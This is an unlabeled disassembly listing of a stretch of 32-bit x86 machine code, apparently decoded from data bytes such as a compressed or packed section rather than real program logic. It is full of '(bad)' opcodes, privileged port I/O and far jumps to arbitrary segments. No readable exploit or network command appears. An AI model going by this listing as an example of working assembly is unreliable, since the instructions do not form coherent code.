  425b5e:	add    ebx,edi
  425b60:	jge    0x425b55
  425b62:	xor    ecx,DWORD PTR [eax-0x3207ef92]
  425b68:	xlat   BYTE PTR ds:[ebx]
  425b69:	xor    dh,dh
  425b6b:	retf   
  425b6c:	or     DWORD PTR [esi],eax
  425b6e:	push   0x13
  425b70:	fsubr  DWORD PTR [ebx+0x48]
  425b73:	dec    edx
  425b74:	sub    edx,0xbf6801ec
  425b7a:	adc    ch,0xf4
  425b7d:	imul   ebp,DWORD PTR [ebx-0x4a6fc6f9],0xf9b384a6
  425b87:	loop   0x425b34
  425b89:	in     eax,0x86
  425b8b:	out    0x5b,al
  425b8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425b8e:	add    eax,0x5efb2894
  425b93:	das    
  425b94:	lea    ecx,[ecx+0x3f]
  425b97:	pop    esp
  425b98:	scas   eax,DWORD PTR es:[edi]
  425b99:	lods   eax,DWORD PTR ds:[esi]
  425b9a:	or     esp,ebp
  425b9c:	adc    BYTE PTR [esi+0x498875d8],ch
  425ba2:	dec    eax
  425ba3:	std    
  425ba4:	out    0xe9,eax
  425ba6:	cmp    eax,0x6d941481
  425bab:	xchg   edi,ecx
  425bad:	lahf   
  425bae:	idiv   dh
  425bb0:	or     BYTE PTR [eax-0x7f],ah
  425bb3:	jl     0x425bf9
  425bb5:	mov    ah,0x2b
  425bb7:	scas   al,BYTE PTR es:[edi]
  425bb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425bb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425bba:	hlt    
  425bbb:	pop    esp
  425bbc:	mov    eax,0xc0713c09
	...
  425c31:	add    BYTE PTR [eax],al
  425c33:	add    BYTE PTR [edx+ebx*8-0x4c],ch
  425c37:	push   0xffffffb6
  425c39:	outs   dx,BYTE PTR ds:[esi]
  425c3a:	(bad)  
  425c3b:	fdivp  st(2),st
  425c3d:	sub    ch,cl
  425c3f:	call   0x91d0:0x47ea7bc4
  425c46:	add    DWORD PTR [eax],eax
  425c48:	cmc    
  425c49:	add    BYTE PTR [eax],al
  425c4b:	add    BYTE PTR [esi+0x1d],al
  425c4e:	jmp    FWORD PTR [esi-0x2b0d4289]
  425c54:	push   esi
  425c55:	es push cs
  425c57:	shl    cl,cl
  425c59:	int    0xeb
  425c5b:	cmc    
  425c5c:	dec    ebp
  425c5d:	sub    BYTE PTR [esi-0x76],0xfe
  425c61:	mov    dl,cl
  425c63:	pop    esi
  425c64:	dec    ebp
  425c65:	fisubr WORD PTR [ebp-0x3c08d38c]
  425c6b:	imul   eax,ebx,0x13126521
  425c71:	mov    esi,ecx
  425c73:	sub    DWORD PTR [edi],eax
  425c75:	mov    ds:0xb9f86ad6,eax
  425c7a:	icebp  
  425c7b:	cwde   
  425c7c:	aad    0x81
  425c7e:	mov    ah,0x8c
  425c80:	pop    ss
  425c81:	inc    esi
  425c82:	aad    0x15
  425c84:	mov    cl,0x10
  425c86:	mov    al,0x5e
  425c88:	shr    BYTE PTR [ecx-0x759e0a8a],1
  425c8e:	or     ebx,eax
  425c90:	sbb    BYTE PTR [ebp+0x52],ch
  425c93:	push   es
  425c94:	inc    eax
  425c95:	div    DWORD PTR [edx-0xd]
  425c98:	(bad)  
  425c99:	repz out 0x2b,al
  425c9c:	shl    ch,0x73
  425c9f:	dec    esi
  425ca0:	pop    ecx
  425ca1:	cmp    eax,0xa07a46a8
  425ca6:	jne    0x425d0f
  425ca8:	push   ebx
  425ca9:	xor    BYTE PTR [ebx+0x1e],dh
  425cac:	shr    BYTE PTR [edi+edx*1-0x3c],1
  425cb0:	push   ds
  425cb1:	add    dh,BYTE PTR [edi-0xdeb5150]
  425cb7:	mov    esp,0x2678e9e9
  425cbc:	mov    ch,0xe1
  425cbe:	or     al,0x32
  425cc0:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425cc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425cc3:	xor    BYTE PTR [edx],bh
  425cc5:	push   esi
  425cc6:	or     cl,bh
  425cc8:	mov    ds:0x33ba370d,eax
  425ccd:	mov    edx,0x4dcf0954
  425cd2:	int3   
  425cd3:	clc    
  425cd4:	pop    esp
  425cd5:	daa    
  425cd6:	push   ds
  425cd7:	dec    esi
  425cd8:	xor    bl,0x53
  425cdb:	aaa    
  425cdc:	ficomp WORD PTR [ebx+0x64]
  425cdf:	add    DWORD PTR ds:0x610fd036,0x3584fbc7
  425ce9:	mov    ds:0xfc293d27,al
  425cee:	jo     0x425c85
  425cf0:	pop    edi
  425cf1:	push   esi
  425cf2:	mov    dl,0x64
  425cf5:	test   BYTE PTR [ebx],0xd6
  425cf8:	pop    esi
  425cf9:	out    dx,eax
  425cfa:	xor    BYTE PTR [edi],dh
  425cfc:	aam    0x21
  425cfe:	xchg   esi,eax
  425cff:	and    eax,DWORD PTR [esi]
  425d01:	rcl    BYTE PTR [eax-0x2c],1
  425d04:	jae    0x425cbf
  425d06:	sub    ebp,DWORD PTR [ebx+ecx*4-0x6e]
  425d0a:	pop    eax
  425d0b:	test   eax,0xa4055fa0
  425d10:	aaa    
  425d11:	loopne 0x425cf4
  425d13:	dec    esp
  425d14:	mov    al,ds:0xd64aba60
  425d19:	test   DWORD PTR [edx-0x5e],edi
  425d1c:	xchg   edi,eax
  425d1d:	mov    dl,0xd7
  425d1f:	ins    BYTE PTR es:[edi],dx
  425d20:	jne    0x425cc4
  425d22:	sbb    DWORD PTR [ebx+0x779a81ad],0xffffff80
  425d29:	mov    BYTE PTR [esi],bl
  425d2b:	repnz sub DWORD PTR [ebx+0x55],ecx
  425d2f:	div    DWORD PTR [esi+0xd]
  425d32:	cs test al,0x41
  425d35:	mov    dl,0x60
  425d37:	inc    eax
  425d38:	push   eax
  425d39:	cmp    dl,BYTE PTR [ecx+0x39a767f5]
  425d3f:	and    DWORD PTR [ebx+0x0],eax
	...
  425db1:	add    BYTE PTR [eax],al
  425db3:	add    BYTE PTR ds:0xf361d20c,bh
  425db9:	(bad)  
  425dba:	mov    edi,0xa480315c
  425dbf:	in     al,dx
  425dc0:	pusha  
  425dc1:	mov    eax,0x92c5259c
  425dc6:	add    DWORD PTR [eax],eax
  425dc8:	cmc    
  425dc9:	add    BYTE PTR [eax],al
  425dcb:	add    BYTE PTR [esi-0x82007a1],ch
  425dd1:	dec    esi
  425dd2:	into   
  425dd3:	inc    ebx
  425dd4:	lahf   
  425dd5:	aam    0x3
  425dd7:	mov    cl,0x9b
  425dd9:	sti    
  425dda:	fist   WORD PTR [edx+0x4afc61a9]
  425de0:	ins    DWORD PTR es:[edi],dx
  425de1:	pop    esp
  425de2:	repnz mov esp,0xccc321db
  425de8:	mov    edx,0x8ff997d5
  425ded:	cli    
  425dee:	mov    ah,0x64
  425df0:	enter  0x373e,0xf
  425df4:	inc    ebx
  425df5:	pop    ebp
  425df6:	jp     0x425e29
  425df8:	outs   dx,BYTE PTR ds:[esi]
  425df9:	jle    0x425da7
  425dfb:	scas   al,BYTE PTR es:[edi]
  425dfc:	or     DWORD PTR [ebx+0x26b45247],ecx
  425e02:	xor    eax,0x45d487a5
  425e07:	inc    esi
  425e08:	mov    al,ds:0x19a77d5
  425e0d:	in     al,0xf9
  425e0f:	jp     0x425e08
  425e11:	xlat   BYTE PTR ds:[ebx]
  425e12:	mov    esp,0x448c5d8c
  425e17:	stc    
  425e18:	clc    
  425e19:	or     eax,0xd21c26e6
  425e1e:	push   0xffffff8a
  425e20:	inc    esi
  425e21:	scas   al,BYTE PTR es:[edi]
  425e22:	repnz lds ebp,FWORD PTR [edi+0x4c169135]
  425e29:	add    DWORD PTR [esi+0x43],edi
  425e2c:	(bad)  
  425e2d:	(bad)  
  425e2e:	fistp  QWORD PTR [esp+edx*2]
  425e31:	mov    al,bl
  425e33:	dec    esp
  425e34:	loopne 0x425eaf
  425e36:	imul   edi,DWORD PTR [edi+0x2a9736fd],0x9a0a16b8
  425e40:	je     0x425e2f
  425e42:	inc    ebp
  425e43:	loope  0x425ea4
  425e45:	xchg   BYTE PTR [eax-0x52],dh
  425e48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425e49:	fadd   QWORD PTR ds:0x433ffd00
  425e4f:	mov    ebp,0x47d8b8cc
  425e54:	xlat   BYTE PTR ds:[ebx]
  425e55:	stos   BYTE PTR es:[edi],al
  425e56:	imul   ah
  425e58:	or     ebp,DWORD PTR [ecx+0x3e]
  425e5b:	aaa    
  425e5c:	cli    
  425e5d:	cdq    
  425e5e:	xchg   esp,eax
  425e5f:	or     eax,DWORD PTR [ecx-0x64cf5aa1]
  425e65:	les    eax,FWORD PTR [edx+0x59]
  425e68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425e69:	add    cl,BYTE PTR [ebp+0x42]
  425e6c:	and    BYTE PTR [ecx+ebp*2+0x6f74e55e],ah
  425e73:	lods   al,BYTE PTR ds:[esi]
  425e74:	mov    eax,0x5867f01a
  425e79:	popa   
  425e7a:	sub    eax,0xf31d7a54
  425e7f:	or     dl,cl
  425e81:	mov    ds:0x56ac5a75,al
  425e86:	xor    DWORD PTR [edx-0x7a],ecx
  425e89:	xchg   edx,eax
  425e8a:	fidivr DWORD PTR [ebx]
  425e8c:	pop    esp
  425e8d:	adc    DWORD PTR [edi-0x1f],ecx
  425e90:	mov    ebx,0x257fa7b5
  425e95:	enter  0x1eda,0xe8
  425e99:	cmc    
  425e9a:	aam    0x5a
  425e9c:	inc    ecx
  425e9d:	call   0x4b77:0x3d35ebe0
  425ea4:	iret   
  425ea5:	adc    ebp,esp
  425ea7:	mov    al,ds:0x2544e679
  425eac:	in     al,0x4a
  425eae:	jnp    0x425ec1
  425eb0:	jnp    0x425efd
  425eb2:	test   BYTE PTR [ecx+0x9cd0feb],bl
  425eb8:	les    edi,FWORD PTR [esi]
  425eba:	test   eax,0x50b32104
  425ebf:	mov    eax,ds:0xdd
	...
  425f34:	dec    ebx
  425f35:	push   ss
  425f36:	int    0x41
  425f38:	fstp   st(3)
  425f3a:	iret   
  425f3b:	push   ds
  425f3c:	lock leave 
  425f3e:	jmp    DWORD PTR [ecx+0x52]
  425f41:	inc    ebx
  425f42:	(bad)  
  425f44:	mov    edx,0xf5000193
  425f49:	add    BYTE PTR [eax],al
  425f4b:	add    BYTE PTR [edx-0x1ae4d2b3],cl
  425f51:	sbb    al,0x7
  425f53:	fld    QWORD PTR [edx+edi*1]
  425f56:	jnp    0x425f08
  425f58:	loop   0x425f35
  425f5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425f5b:	mov    edi,0xe8f67031
  425f60:	fnstcw WORD PTR [edx+0x55]
  425f63:	jle    0x425fd2
  425f65:	fnsave [edi+edx*4]
  425f68:	push   ebx
  425f69:	popa   
  425f6a:	and    BYTE PTR ds:0x9617afe5,bl
  425f70:	xchg   ch,ah
  425f72:	inc    DWORD PTR [ebp+0x8]
  425f75:	xor    dh,BYTE PTR [esi-0x3eebb369]
  425f7b:	and    DWORD PTR [edi-0x2156c4f4],esi
  425f81:	inc    DWORD PTR [esi]
  425f83:	aas    
  425f84:	jle    0x425fe3
  425f86:	mov    ds:0xb6c59e6f,eax
  425f8b:	add    DWORD PTR [ebx-0x7e],ebp
  425f8e:	sbb    eax,0x85b8717a
  425f93:	bound  edx,QWORD PTR [edx+0x69]
  425f96:	sbb    DWORD PTR [esi-0x10daabaf],ecx
  425f9c:	das    
  425f9d:	xchg   edi,eax
  425f9e:	jmp    0x60a0fe24
  425fa3:	jecxz  0x425f92
  425fa5:	push   edx
  425fa6:	and    cl,BYTE PTR [esi-0x5c]
  425fa9:	iret   
  425faa:	xchg   esp,eax
  425fab:	xor    al,0x12
  425fad:	add    eax,0xbff3f473
  425fb2:	cld    
  425fb3:	mov    ds:0xbcad627b,al
  425fb8:	fist   DWORD PTR ds:0xd19eead7
  425fbe:	call   0x4fdc01d7
  425fc3:	jns    0x426034
  425fc5:	div    ebx
  425fc7:	mov    esi,0xd93bb6d1
  425fcc:	inc    edx
  425fcd:	lods   al,BYTE PTR ds:[esi]
  425fce:	ds cmp ah,bl
  425fd1:	les    ebx,FWORD PTR [ebx+ebx*2]
  425fd4:	xchg   BYTE PTR [ecx+eiz*2-0x25fdc429],bl
  425fdb:	xor    eax,0x601e69f
  425fe0:	adc    dl,BYTE PTR [eax-0x1b3e6d95]
  425fe6:	cmc    
  425fe7:	aas    
  425fe8:	into   
  425fe9:	ficomp WORD PTR [esi+eiz*8-0x5f]
  425fed:	clc    
  425fee:	outs   dx,BYTE PTR ds:[esi]
  425fef:	mov    ebx,0xd66bd884
  425ff4:	jno    0x42600e
  425ff6:	jp     0x425fec
  425ff8:	mov    ds:0x31350828,al
  425ffd:	in     eax,dx
  425ffe:	enter  0xee33,0x26
  426002:	neg    DWORD PTR [eax+edx*1-0x62]
  426006:	xchg   ebx,eax
  426007:	in     al,dx
  426008:	popf   
  426009:	pusha  
  42600a:	out    dx,eax
  42600b:	add    al,0x0
  42600d:	in     al,0x75
  42600f:	dec    esp
  426010:	inc    edx
  426011:	aam    0xf8
  426013:	pop    ebp
  426014:	cdq    
  426015:	cli    
  426016:	cmc    
  426017:	xchg   DWORD PTR [eax+edx*1+0x3c],edi
  42601b:	adc    al,0xc5
  42601d:	neg    BYTE PTR [esi+0x2d]
  426020:	test   BYTE PTR [bp+si],al
  426023:	(bad)  
  426024:	or     edx,DWORD PTR [edx+0x17e2cd51]
  42602a:	dec    ecx
  42602b:	popf   
  42602c:	inc    edx
  42602d:	repz push es
  42602f:	shl    esp,cl
  426031:	mov    bh,bl
  426033:	mov    dh,BYTE PTR [edi]
  426035:	jl     0x425fe2
  426037:	mov    ebp,0xd54fa512
  42603c:	fdiv   DWORD PTR [edi]
  42603e:	adc    BYTE PTR [ebp+0x1a],ah
	...
  4260b4:	ficom  WORD PTR [ecx]
  4260b6:	lahf   
  4260b7:	and    ebx,edi
  4260b9:	scas   eax,DWORD PTR es:[edi]
  4260ba:	(bad)  
  4260bb:	std    
  4260bc:	sub    al,0x28
  4260be:	pop    ds
  4260bf:	mov    eax,ds:0x3aaa7a82
  4260c4:	scas   eax,DWORD PTR es:[edi]
  4260c5:	xchg   esp,eax
  4260c6:	add    DWORD PTR [eax],eax
  4260c8:	cmc    
  4260c9:	add    BYTE PTR [eax],al
  4260cb:	add    dh,bh
  4260cd:	fdiv   DWORD PTR [ebx]
  4260cf:	xchg   ebx,eax
  4260d0:	xor    eax,DWORD PTR [esi-0x2c58a401]
  4260d6:	leave  
  4260d7:	leave  
  4260d8:	(bad)  
  4260d9:	stc    
  4260da:	icebp  
  4260db:	sub    BYTE PTR [ebp-0x3778ea7b],dh
  4260e1:	add    ebp,DWORD PTR [ebx+0x60aa0a77]
  4260e7:	neg    BYTE PTR ds:0x269baa1c
  4260ed:	mov    dl,0x9a
  4260ef:	int    0x17
  4260f1:	mov    ebx,0xe94b21b8
  4260f6:	ins    BYTE PTR es:[edi],dx
  4260f7:	ja     0x4260f8
  4260f9:	xor    DWORD PTR [ecx-0x1ca98686],ecx
  4260ff:	mov    dh,0xee
  426101:	jecxz  0x4260f3
  426103:	xor    ah,BYTE PTR [ebx+0x5b5a1bc2]
  426109:	push   edx
  42610a:	push   ds
  42610b:	push   cs
  42610c:	mov    al,ds:0x907a6434
  426111:	xor    eax,0x3678d499
  426116:	cmp    al,0xf4
  426118:	and    eax,0x98f7f993
  42611d:	add    BYTE PTR [eax-0x11],dl
  426120:	cmp    DWORD PTR [eax+0x3c],edi
  426123:	jmp    0x8d41952a
  426128:	mov    ecx,0xbcb58d65
  42612d:	(bad)  
  42612e:	sub    cl,BYTE PTR [ebx-0xd141b98]
  426134:	xor    al,BYTE PTR ds:0xfc77746d
  42613a:	mov    esp,0x37abfb87
  42613f:	jbe    0x42619b
  426141:	rcl    BYTE PTR [ecx],1
  426143:	add    BYTE PTR [edx+0x47],ch
  426146:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426147:	mov    al,ds:0x5388a967
  42614c:	xchg   esi,eax
  42614d:	arpl   WORD PTR [ebp-0x66705adb],si
  426153:	fmul   DWORD PTR [edi-0x11]
  426156:	cmp    ecx,DWORD PTR [ebx]
  426158:	aas    
  426159:	adc    BYTE PTR [edi],al
  42615b:	or     edx,edx
  42615d:	pop    ss
  42615e:	mov    WORD PTR [ecx-0x29],gs
  426161:	scas   al,BYTE PTR es:[edi]
  426162:	mov    DWORD PTR [ebx-0xe33ab2f],0xff5be4dd
  42616c:	and    DWORD PTR [edi-0x7f],ebx
  42616f:	test   BYTE PTR [esi+0x68],0x92
  426173:	mov    ds:0xbd72af5b,eax
  426178:	sbb    al,0x62
  42617a:	xor    eax,0xd6b6f060
  42617f:	push   es
  426180:	daa    
  426181:	rol    BYTE PTR [ebx],0x7a
  426184:	gs pop ebx
  426186:	sub    cl,BYTE PTR ds:0xdd66b2d1
  42618c:	leave  
  42618d:	jl     0x4261c3
  42618f:	xor    al,0x8d
  426191:	popf   
  426192:	mov    BYTE PTR [ebx],dl
  426194:	call   0x5f86ddb7
  426199:	push   ebp
  42619a:	popf   
  42619b:	retf   
  42619c:	test   BYTE PTR [ebp+0x2fa0de6],al
  4261a2:	dec    edi
  4261a3:	sbb    DWORD PTR [esi-0x70],ebx
  4261a6:	add    eax,0x5adfba0c
  4261ab:	push   cs
  4261ac:	ds js  0x426218
  4261af:	enter  0x92a1,0x5
  4261b3:	push   ecx
  4261b4:	xor    eax,0x3f6ac5aa
  4261b9:	push   es
  4261ba:	xchg   ebx,eax
  4261bb:	add    eax,0x42a2cca7
  4261c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  426231:	add    BYTE PTR [eax],al
  426233:	add    BYTE PTR [esp+eax*8-0x84318d],ch
  42623a:	mov    ebp,0xdfb43ee6
  42623f:	push   0xfffffffa
  426241:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426242:	jnp    0x42623d
  426244:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426245:	xchg   ebp,eax
  426246:	add    DWORD PTR [eax],eax
  426248:	cmc    
  426249:	add    BYTE PTR [eax],al
  42624b:	add    BYTE PTR [edi],ah
  42624d:	sub    BYTE PTR [edx+0x6c75723e],ch
  426253:	xchg   ecx,eax
  426254:	mov    bh,0x96
  426256:	cmp    ch,BYTE PTR [ecx+0x67]
  426259:	pop    eax
  42625a:	neg    ch
  42625c:	mov    ebp,0x1ccba387
  426261:	push   ebx
  426262:	(bad)  [ecx]
  426264:	push   ss
  426265:	fwait
  426266:	mov    bh,0x86
  426268:	add    BYTE PTR [edi],bh
  42626a:	(bad)  [ecx+eiz*4]
  42626d:	or     BYTE PTR [ecx+edx*4+0x55],dh
  426271:	imul   edi,DWORD PTR [ebp-0x35a8d41e],0x28
  426278:	dec    esi
  426279:	lock jl 0x42621d
  42627c:	fbld   TBYTE PTR [eax]
  42627e:	test   DWORD PTR [ebx],edi
  426280:	adc    bl,BYTE PTR fs:[edx+0x5f]
  426284:	out    0x9e,eax
  426286:	jle    0x4262a6
  426288:	loop   0x426274
  42628a:	mov    ds:0x9d64eb9a,eax
  42628f:	pushf  
  426290:	and    bh,0xf9
  426293:	shl    BYTE PTR [edx],cl
  426295:	inc    edi
  426296:	dec    eax
  426297:	xchg   BYTE PTR [edi],dh
  426299:	sbb    BYTE PTR [eax+0x7df2fec3],ah
  42629f:	retf   0xee59
  4262a2:	into   
  4262a3:	adc    esp,DWORD PTR [edx-0x2da39beb]
  4262a9:	mov    ebp,0xd9bcd400
  4262ae:	lock ret 0x9a05
  4262b2:	sahf   
  4262b3:	mov    esi,0x51587686
  4262b8:	enter  0x588a,0xd9
  4262bc:	sti    
  4262bd:	fisttp WORD PTR [eax-0x6d0ec122]
  4262c3:	repnz inc ebx
  4262c5:	dec    ecx
  4262c6:	(bad)  
  4262c7:	outs   dx,DWORD PTR ds:[esi]
  4262c8:	and    BYTE PTR fs:[ecx+ecx*2-0x2f67f29c],ch
  4262d0:	sub    ebx,edx
  4262d2:	and    edx,ebx
  4262d4:	test   eax,0x8adaa610
  4262d9:	rcr    ecx,0x8b
  4262dc:	add    eax,0x55503542
  4262e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4262e2:	cmp    DWORD PTR [edi],esp
  4262e4:	add    edx,eax
  4262e6:	push   ds
  4262e7:	leave  
  4262e8:	jl     0x64608893
  4262ee:	push   eax
  4262ef:	xor    al,0xe9
  4262f1:	dec    esp
  4262f2:	mov    bh,0x11
  4262f4:	jb     0x4262e5
  4262f6:	xor    edi,DWORD PTR [ecx+eiz*8-0x78331bc9]
  4262fd:	xchg   BYTE PTR ds:0x98391aff,ch
  426303:	out    dx,al
  426304:	addr16 popa 
  426306:	ror    DWORD PTR [esi+0x41],0x22
  42630a:	sahf   
  42630b:	std    
  42630c:	or     eax,0xa1ab755e
  426311:	clc    
  426312:	mov    dh,0xa0
  426314:	jno    0x4262de
  426316:	ds jmp 0xab10:0xc37ce2dc
  42631e:	add    DWORD PTR [ebx-0x4a],ecx
  426321:	(bad)
  426324:	mov    esi,0x106a3dae
  426329:	and    al,BYTE PTR [esi-0x20]
  42632c:	adc    cl,dl
  42632e:	jle    0x42639a
  426330:	push   DWORD PTR [ebp-0x7c]
  426333:	mul    WORD PTR [ecx]
  426336:	inc    esp
  426337:	dec    edi
  426338:	(bad)  
  426339:	sahf   
  42633a:	adc    edx,ebp
  42633c:	mov    esi,0x76918085
	...
  4263b1:	add    BYTE PTR [eax],al
  4263b3:	add    BYTE PTR [edx+0x9],al
  4263b6:	les    ebp,FWORD PTR [ecx-0x14901231]
  4263bc:	(bad)  
  4263be:	mov    dh,0xba
  4263c0:	das    
  4263c1:	lods   al,BYTE PTR ds:[esi]
  4263c2:	lock cwde 
  4263c4:	cdq    
  4263c5:	xchg   esi,eax
  4263c6:	add    DWORD PTR [eax],eax
  4263c8:	cmc    
  4263c9:	add    BYTE PTR [eax],al
  4263cb:	add    BYTE PTR [edx-0x4715cd5],dl
  4263d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4263d2:	aas    
  4263d3:	push   edx
  4263d4:	mov    bl,0x58
  4263d6:	div    DWORD PTR fs:[ecx-0x6f393cc]
  4263dd:	loope  0x42641a
  4263df:	pusha  
  4263e0:	in     eax,dx
  4263e1:	out    dx,eax
  4263e2:	mov    fs:0xdaee8a16,al
  4263e8:	pop    esi
  4263e9:	je     0x4263be
  4263eb:	out    dx,eax
  4263ec:	add    al,0xd4
  4263ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4263ef:	or     cl,BYTE PTR [esi+ebx*1+0x21]
  4263f3:	sub    bh,BYTE PTR [ebp+0x1bccce32]
  4263f9:	cmc    
  4263fa:	xchg   DWORD PTR [ebp+0x4e],eax
  4263fd:	call   0xc28f2ba8
  426402:	sub    esp,DWORD PTR [ebx]
  426404:	loop   0x4263ff
  426406:	lods   al,BYTE PTR ds:[esi]
  426407:	addr16 inc ecx
  426409:	ds xor eax,0x8fe9c664
  42640f:	cmp    BYTE PTR [esi-0x5d],0xff
  426413:	mov    al,BYTE PTR [ebp-0x7d]
  426416:	ret    
  426417:	inc    edi
  426418:	or     ebp,ecx
  42641a:	cs mov al,0xab
  42641d:	loop   0x4263df
  42641f:	add    al,0xd3
  426421:	xchg   esi,ebp
  426423:	mul    DWORD PTR [edx]
  426425:	ja     0x42647d
  426427:	xor    ecx,DWORD PTR [di-0x1aa0]
  42642c:	adc    eax,0x5af6f0b
  426431:	add    ah,dl
  426433:	mov    cs,WORD PTR [edi+0x370aaa74]
  426439:	push   edi
  42643a:	es ret 0x6b4
  42643e:	in     al,0xd6
  426440:	xor    BYTE PTR [eax+0x1f86ebbd],cl
  426446:	sub    BYTE PTR [eax+0x52],0xaf
  42644a:	mov    ecx,DWORD PTR [eax-0x2902233]
  426450:	dec    esi
  426451:	je     0x4263ea
  426453:	add    DWORD PTR [eax+0x53e398b9],0xffffffb1
  42645a:	(bad)  
  42645b:	dec    ebp
  42645c:	ds pushf 
  42645e:	call   0x6486:0x1132ea2b
  426465:	mov    ebp,0x1ead510
  42646a:	mov    dh,0x70
  42646c:	xor    DWORD PTR [edi+ebx*1],ebp
  42646f:	fld    QWORD PTR [edx-0x4eb0ba4c]
  426475:	push   0xffffffc0
  426477:	out    dx,al
  426478:	or     esp,DWORD PTR [ebp+0x659811c0]
  42647e:	sub    al,0xb8
  426480:	inc    eax
  426481:	call   0xd1331eb6
  426486:	xchg   edi,eax
  426487:	jmp    0x96396c21
  42648c:	and    dh,dh
  42648e:	int3   
  42648f:	add    BYTE PTR [edi+ebp*8-0x2c985101],bl
  426496:	add    al,0xb8
  426498:	fstp   DWORD PTR [esi]
  42649a:	sahf   
  42649b:	ja     0x426463
  42649d:	xchg   ecx,eax
  42649e:	cmc    
  42649f:	popa   
  4264a0:	pop    edi
  4264a1:	les    esi,FWORD PTR [eax]
  4264a3:	cdq    
  4264a4:	enter  0xbf03,0x6c
  4264a8:	or     BYTE PTR [edx-0x6fb2a001],dl
  4264ae:	or     ecx,esp
  4264b0:	out    0x9,al
  4264b2:	mov    bl,0xa9
  4264b4:	push   0x8f905d8e
  4264b9:	xor    al,bh
  4264bb:	xchg   esi,eax
  4264bc:	xchg   esi,eax
  4264bd:	aaa    
  4264be:	xchg   ecx,eax
  4264bf:	sub    al,0x5e
	...
  426531:	add    BYTE PTR [eax],al
  426533:	add    ah,al
  426535:	jmp    0xfef4:0xfe6e7a4e
  42653c:	loop   0x42656c
  42653e:	dec    ebx
  42653f:	pop    esp
  426540:	and    bh,BYTE PTR ds:0x978e8eea
  426546:	add    DWORD PTR [eax],eax
  426548:	cmc    
  426549:	add    BYTE PTR [eax],al
  42654b:	add    BYTE PTR [ecx],ch
  42654d:	ins    BYTE PTR es:[edi],dx
  42654e:	sub    ch,BYTE PTR [edx+0x4207a585]
  426554:	add    edx,edi
  426556:	dec    ebp
  426557:	mov    al,0xb0
  426559:	add    al,0xbd
  42655b:	mov    ah,0xfc
  42655d:	das    
  42655e:	sub    DWORD PTR [edi+0x6c],edx
  426561:	clc    
  426562:	jbe    0x426511
  426564:	fsave  [edx]
  426567:	inc    esi
  426568:	fwait
  426569:	xor    ebp,DWORD PTR [eax-0x1b61834b]
  42656f:	jle    0x42653c
  426571:	fldenv [eax-0x4b3d4e2a]
  426577:	pop    ecx
  426578:	repnz inc esi
  42657a:	js     0x42654b
  42657c:	mov    eax,0xa382c17b
  426581:	fisub  DWORD PTR [ebx-0x7f064344]
  426587:	pop    ebx
  426588:	stos   DWORD PTR es:[edi],eax
  426589:	sub    esp,edx
  42658b:	mov    ah,0xe5
  42658d:	(bad)
  426591:	inc    ebp
  426592:	(bad)  
  426593:	pop    ds
  426594:	retf   
  426595:	es sub dh,ah
  426598:	cmp    dh,dl
  42659a:	test   edx,eax
  42659c:	mov    esp,0x4f125f74
  4265a1:	sbb    bl,dh
  4265a3:	ds (bad) 
  4265a5:	cld    
  4265a6:	add    BYTE PTR [ebx+eax*8],al
  4265a9:	and    DWORD PTR [eax-0x12],edi
  4265ac:	repnz mov ah,0x55
  4265af:	inc    edi
  4265b0:	cmp    ebp,DWORD PTR [edi+0xf415590]
  4265b6:	fsubr  st,st(2)
  4265b8:	loopne 0x4265e3
  4265ba:	(bad)  
  4265bb:	pop    ebx
  4265bc:	in     eax,dx
  4265bd:	out    0x96,eax
  4265bf:	(bad)  
  4265c0:	dec    ecx
  4265c1:	bound  ebx,QWORD PTR [edi]
  4265c3:	aam    0x90
  4265c5:	not    edx
  4265c7:	daa    
  4265c8:	out    0x9e,al
  4265ca:	dec    ebp
  4265cb:	xor    BYTE PTR [ecx],dh
  4265cd:	mov    bl,0xa7
  4265cf:	outs   dx,DWORD PTR ds:[esi]
  4265d0:	or     dl,BYTE PTR [edi+ebp*1+0x716346aa]
  4265d7:	sbb    al,0x9f
  4265d9:	ins    DWORD PTR es:[edi],dx
  4265da:	jl     0x426648
  4265dc:	dec    ecx
  4265dd:	or     BYTE PTR [ebx],al
  4265df:	jl     0x42657f
  4265e1:	aam    0x3a
  4265e3:	sar    ecx,0x5
  4265e6:	sub    BYTE PTR [esi-0x26],ch
  4265e9:	dec    eax
  4265ea:	jmp    0x42660a
  4265ec:	ins    DWORD PTR es:[edi],dx
  4265ed:	jecxz  0x4265bf
  4265ef:	sub    ch,dl
  4265f1:	mov    esi,0xf66ef3d3
  4265f6:	fsubp  st(0),st
  4265f8:	xor    al,0x89
  4265fa:	add    BYTE PTR [ebx-0x9],al
  4265fd:	push   edx
  4265fe:	add    edx,DWORD PTR es:[edi+0x141c37c4]
  426605:	ret    
  426606:	popa   
  426607:	and    ah,BYTE PTR [esi]
  426609:	fcomp  QWORD PTR [esi]
  42660b:	cmp    BYTE PTR [ecx],0x69
  42660e:	pop    ebx
  42660f:	pop    eax
  426610:	jp     0x4265ed
  426612:	xchg   edx,eax
  426613:	push   ss
  426614:	or     eax,0x355f4203
  426619:	retf   
  42661a:	sub    edi,esp
  42661c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42661d:	add    al,BYTE PTR [edx+ebx*1-0x3bca3357]
  426624:	aaa    
  426625:	rol    DWORD PTR [eax+0x12380643],0x94
  42662c:	dec    ebx
  42662d:	repnz out dx,al
  42662f:	mov    ebx,DWORD PTR [edi-0x4f]
  426632:	xor    eax,edx
  426634:	aad    0xe6
  426636:	pop    ebp
  426637:	sub    DWORD PTR [esi+0x29bc3c1c],esi
  42663d:	xchg   DWORD PTR [ebx+0x1763],eax
	...
  4266b3:	add    dh,dl
  4266b5:	aaa    
